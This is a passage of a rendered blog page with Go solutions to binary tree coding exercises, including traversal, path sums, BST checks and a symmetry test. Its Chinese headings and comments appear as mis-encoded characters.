class="keyword">if</span> root == <span class="literal">nil</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    res := []<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">    q := []*TreeNode&#123;root&#125;</span><br><span class="line">    tmp := []*TreeNode&#123;&#125;</span><br><span class="line">    l := <span class="built_in">len</span>(q)</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">len</span>(q) != <span class="number">0</span>&#123;</span><br><span class="line">        l = <span class="built_in">len</span>(q)</span><br><span class="line">        tmp = []*TreeNode&#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;l;i++&#123;</span><br><span class="line">            res = <span class="built_in">append</span>(res,q[i].Val)</span><br><span class="line">            <span class="keyword">if</span> q[i].Left != <span class="literal">nil</span>&#123;</span><br><span class="line">                tmp = <span class="built_in">append</span>(tmp,q[i].Left)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> q[i].Right != <span class="literal">nil</span>&#123;</span><br><span class="line">                tmp = <span class="built_in">append</span>(tmp,q[i].Right)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        q = tmp</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="äºŒå‰æœç´¢æ ‘çš„ååºéå†åºåˆ—"><a href="#äºŒå‰æœç´¢æ ‘çš„ååºéå†åºåˆ—" class="headerlink" title="äºŒå‰æœç´¢æ ‘çš„ååºéå†åºåˆ—"></a><strong>äºŒå‰æœç´¢æ ‘çš„ååºéå†åºåˆ—</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä»£ç ä¸­çš„ç±»åã€æ–¹æ³•åã€å‚æ•°åå·²ç»æŒ‡å®šï¼Œè¯·å‹¿ä¿®æ”¹ï¼Œç›´æ¥è¿”å›æ–¹æ³•è§„å®šçš„å€¼å³å¯</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param sequence intæ•´å‹ä¸€ç»´æ•°ç»„</span></span><br><span class="line"><span class="comment"> * @return boolå¸ƒå°”å‹</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">VerifySquenceOfBST</span><span class="params">(sequence []<span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> sequence == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> helperDC(sequence, <span class="number">0</span>, <span class="built_in">len</span>(sequence)<span class="number">-1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">helperDC</span><span class="params">(arr []<span class="keyword">int</span>, left <span class="keyword">int</span>, right <span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line"><span class="comment">// å½“å‰å­æ ‘åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæ ¹èŠ‚ç‚¹</span></span><br><span class="line"><span class="keyword">if</span> left &gt;= right &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">root := arr[right]</span><br><span class="line">i, j := <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="comment">// æ‰¾åˆ°å³å­æ ‘èŒƒå›´ j+1 : right</span></span><br><span class="line"><span class="keyword">for</span> j = right - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j-- &#123;</span><br><span class="line"><span class="keyword">if</span> arr[j] &lt; root &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// å·¦å­æ ‘æ˜¯å¦ç¬¦åˆ</span></span><br><span class="line"><span class="keyword">for</span> i = left; i &lt;= j; i++ &#123;</span><br><span class="line"><span class="keyword">if</span> arr[i] &gt; root &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> helperDC(arr, left, j) &amp;&amp; helperDC(arr, j+<span class="number">1</span>, right<span class="number">-1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="äºŒå‰æ ‘ä¸­å’Œä¸ºæŸä¸€å€¼çš„è·¯å¾„-ä¸€"><a href="#äºŒå‰æ ‘ä¸­å’Œä¸ºæŸä¸€å€¼çš„è·¯å¾„-ä¸€" class="headerlink" title="äºŒå‰æ ‘ä¸­å’Œä¸ºæŸä¸€å€¼çš„è·¯å¾„(ä¸€)"></a><strong>äºŒå‰æ ‘ä¸­å’Œä¸ºæŸä¸€å€¼çš„è·¯å¾„(ä¸€)</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * </span></span><br><span class="line"><span class="comment">  * @param root TreeNodeç±» </span></span><br><span class="line"><span class="comment">  * @param sum intæ•´å‹ </span></span><br><span class="line"><span class="comment">  * @return boolå¸ƒå°”å‹</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hasPathSum</span><span class="params">( root *TreeNode ,  sum <span class="keyword">int</span> )</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span> root == <span class="literal">nil</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    l := hasPathSum(root.Left,sum - root.Val)</span><br><span class="line">    <span class="keyword">if</span> l==<span class="literal">true</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    r := hasPathSum(root.Right,sum - root.Val)</span><br><span class="line">    <span class="keyword">if</span> r==<span class="literal">true</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">if</span> sum == root.Val &amp;&amp; root.Left==<span class="literal">nil</span> &amp;&amp; root.Right==<span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="äºŒå‰æ ‘ä¸­å’Œä¸ºæŸä¸€å€¼çš„è·¯å¾„-äºŒ"><a href="#äºŒå‰æ ‘ä¸­å’Œä¸ºæŸä¸€å€¼çš„è·¯å¾„-äºŒ" class="headerlink" title="äºŒå‰æ ‘ä¸­å’Œä¸ºæŸä¸€å€¼çš„è·¯å¾„(äºŒ)"></a>äºŒå‰æ ‘ä¸­å’Œä¸ºæŸä¸€å€¼çš„è·¯å¾„(äºŒ)</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä»£ç ä¸­çš„ç±»åã€æ–¹æ³•åã€å‚æ•°åå·²ç»æŒ‡å®šï¼Œè¯·å‹¿ä¿®æ”¹ï¼Œç›´æ¥è¿”å›æ–¹æ³•è§„å®šçš„å€¼å³å¯</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param root TreeNodeç±» </span></span><br><span class="line"><span class="comment"> * @param expectNumber intæ•´å‹ </span></span><br><span class="line"><span class="comment"> * @return intæ•´å‹äºŒç»´æ•°ç»„</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¸éœ€è¦å›æº¯</span></span><br><span class="line"><span class="comment">//å£°æ˜å˜é‡ä¸è¦å†™æˆ var res [][]int&#123;&#125;</span></span><br><span class="line"><span class="comment">//è·å–æœ€ç»ˆç»“æœè¦æŠŠæœ€ç»ˆç»“æœå†™æˆå…¨å±€å˜é‡</span></span><br><span class="line"><span class="keyword">var</span> res [][]<span class="keyword">int</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">FindPath</span><span class="params">( root *TreeNode ,  expectNumber <span class="keyword">int</span> )</span> [][]<span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    tmp := []<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> root == <span class="literal">nil</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    get(root,expectNumber,tmp)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">get</span><span class="params">(  root *TreeNode ,  expectNumber <span class="keyword">int</span>  ,tmp []<span class="keyword">int</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> root == <span class="literal">nil</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    &#125;</span><br><span class="line">    tmp = <span class="built_in">append</span>(tmp, root.Val)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> expectNumber == root.Val &amp;&amp; root.Left==<span class="literal">nil</span> &amp;&amp; root.Right==<span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="comment">//åªå†™tmp...ç›¸å½“äºæ˜¯æŠŠé‡Œé¢çš„å…ƒç´ ä¸€ä¸ªä¸€ä¸ªåŠ è¿›å»ï¼Œæˆ‘ä»¬è¦çš„æ˜¯åŠ ä¸€ä¸ªslice</span></span><br><span class="line">        res = <span class="built_in">append</span>(res, <span class="built_in">append</span>([]<span class="keyword">int</span>&#123;&#125;, tmp...))</span><br><span class="line">    &#125;</span><br><span class="line">    get(root.Left,expectNumber - root.Val,tmp)</span><br><span class="line">    get(root.Right,expectNumber - root.Val,tmp)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">func hasPathSum( root *TreeNode ,  sum int ) bool &#123;</span></span><br><span class="line"><span class="comment">    // write code here</span></span><br><span class="line"><span class="comment">    if root == nil&#123;</span></span><br><span class="line"><span class="comment">        return false</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">   </span></span><br><span class="line"><span class="comment">    l := hasPathSum(root.Left,sum - root.Val)</span></span><br><span class="line"><span class="comment">    if l==true&#123;</span></span><br><span class="line"><span class="comment">        return true</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    r := hasPathSum(root.Right,sum - root.Val)</span></span><br><span class="line"><span class="comment">    if r==true&#123;</span></span><br><span class="line"><span class="comment">        return true</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">     if sum == root.Val &amp;&amp; root.Left==nil &amp;&amp; root.Right==nil &#123;</span></span><br><span class="line"><span class="comment">        return true</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return false</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="äºŒå‰æœç´¢æ ‘ä¸åŒå‘é“¾è¡¨"><a href="#äºŒå‰æœç´¢æ ‘ä¸åŒå‘é“¾è¡¨" class="headerlink" title="äºŒå‰æœç´¢æ ‘ä¸åŒå‘é“¾è¡¨"></a>äºŒå‰æœç´¢æ ‘ä¸åŒå‘é“¾è¡¨</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param pRootOfTree TreeNodeç±» </span></span><br><span class="line"><span class="comment"> * @return TreeNodeç±»</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Convert</span><span class="params">( pRootOfTree *TreeNode )</span> *<span class="title">TreeNode</span></span> &#123;</span><br><span class="line">     <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">var</span> f <span class="function"><span class="keyword">func</span><span class="params">(root *TreeNode)</span></span></span><br><span class="line">    <span class="keyword">var</span> pre *TreeNode = <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">var</span> head *TreeNode = <span class="literal">nil</span></span><br><span class="line">    f = <span class="function"><span class="keyword">func</span><span class="params">(root *TreeNode)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> root == <span class="literal">nil</span>&#123;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        f(root.Left)</span><br><span class="line">        <span class="keyword">if</span> pre == <span class="literal">nil</span>&#123;</span><br><span class="line">            head = root</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            root.Left, pre.Right = pre, root</span><br><span class="line">        &#125;</span><br><span class="line">        pre = root</span><br><span class="line">        f(root.Right)</span><br><span class="line">    &#125;</span><br><span class="line">    f(pRootOfTree)</span><br><span class="line">    <span class="keyword">return</span> head</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åˆ¤æ–­æ˜¯ä¸æ˜¯å¹³è¡¡äºŒå‰æ ‘"><a href="#åˆ¤æ–­æ˜¯ä¸æ˜¯å¹³è¡¡äºŒå‰æ ‘" class="headerlink" title="åˆ¤æ–­æ˜¯ä¸æ˜¯å¹³è¡¡äºŒå‰æ ‘"></a>åˆ¤æ–­æ˜¯ä¸æ˜¯å¹³è¡¡äºŒå‰æ ‘</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param pRoot TreeNodeç±» </span></span><br><span class="line"><span class="comment"> * @return boolå¸ƒå°”å‹</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IsBalanced_Solution</span><span class="params">( pRoot *TreeNode )</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line"><span class="keyword">return</span> TreeDepth(pRoot)&gt;<span class="number">-1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">abs</span><span class="params">(a <span class="keyword">int</span>)</span><span class="title">int</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> a&lt;<span class="number">0</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> -a</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">max</span><span class="params">(a,b <span class="keyword">int</span>)</span><span class="title">int</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> a&gt;b&#123;</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TreeDepth</span><span class="params">(root *TreeNode)</span><span class="title">int</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> root==<span class="literal">nil</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    leftDept:=TreeDepth(root.Left)</span><br><span class="line">    rightDept:=TreeDepth(root.Right)</span><br><span class="line">    <span class="keyword">if</span> leftDept==<span class="number">-1</span>||rightDept==<span class="number">-1</span>||abs(leftDept-rightDept)&gt;<span class="number">1</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max(leftDept,rightDept)+<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="äºŒå‰æ ‘çš„ä¸‹ä¸€ä¸ªç»“ç‚¹"><a href="#äºŒå‰æ ‘çš„ä¸‹ä¸€ä¸ªç»“ç‚¹" class="headerlink" title="äºŒå‰æ ‘çš„ä¸‹ä¸€ä¸ªç»“ç‚¹"></a>äºŒå‰æ ‘çš„ä¸‹ä¸€ä¸ªç»“ç‚¹</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">type TreeLinkNode struct &#123;</span></span><br><span class="line"><span class="comment">    Val int</span></span><br><span class="line"><span class="comment">    Left *TreeLinkNode</span></span><br><span class="line"><span class="comment">    Right *TreeLinkNode</span></span><br><span class="line"><span class="comment">    Next *TreeLinkNode</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetNext</span><span class="params">(p *TreeLinkNode)</span> *<span class="title">TreeLinkNode</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> p == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> p.Right != <span class="literal">nil</span> &#123;</span><br><span class="line">        p = p.Right</span><br><span class="line">        <span class="keyword">for</span> p.Left != <span class="literal">nil</span> &#123;</span><br><span class="line">            p = p.Left</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> p.Next != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> p == p.Next.Left &#123;</span><br><span class="line">            <span class="keyword">return</span> p.Next</span><br><span class="line">        &#125;</span><br><span class="line">        p = p.Next</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å¯¹ç§°çš„äºŒå‰æ ‘"><a href="#å¯¹ç§°çš„äºŒå‰æ ‘" class="headerlink" title="å¯¹ç§°çš„äºŒå‰æ ‘"></a>å¯¹ç§°çš„äºŒå‰æ ‘</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä»£ç ä¸­çš„ç±»åã€æ–¹æ³•åã€å‚æ•°åå·²ç»æŒ‡å®šï¼Œè¯·å‹¿ä¿®æ”¹ï¼Œç›´æ¥è¿”å›æ–¹æ³•è§„å®šçš„å€¼å³å¯</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param pRoot TreeNodeç±» </span></span><br><span class="line"><span class="comment"> * @return boolå¸ƒå°”å‹</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isSymmetrical</span><span class="params">( pRoot *TreeNode )</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span> pRoot==<span class="literal">nil</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> process(pRoot.Left,pRoot.Right)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">process</span><span class="params">(lRoot *TreeNode,rRoot *TreeNode)</span><span class="title">bool</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> lRoot==<span class="literal">nil</span>&amp;&amp;rRoot==<span class="literal">nil</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (lRoot==<span class="literal">nil</span>&amp;&amp;rRoot!=<span class="literal">nil</span>)|| (lRoot!=<span class="literal">nil</span>&amp;&amp;rRoot==<span class="literal">nil</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> lRoot.Val==rRoot.Val&amp;&amp;process(lRoot.Left,rRoot.Right)&amp;&amp;process(lRoot.Right,rRoot.Left)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 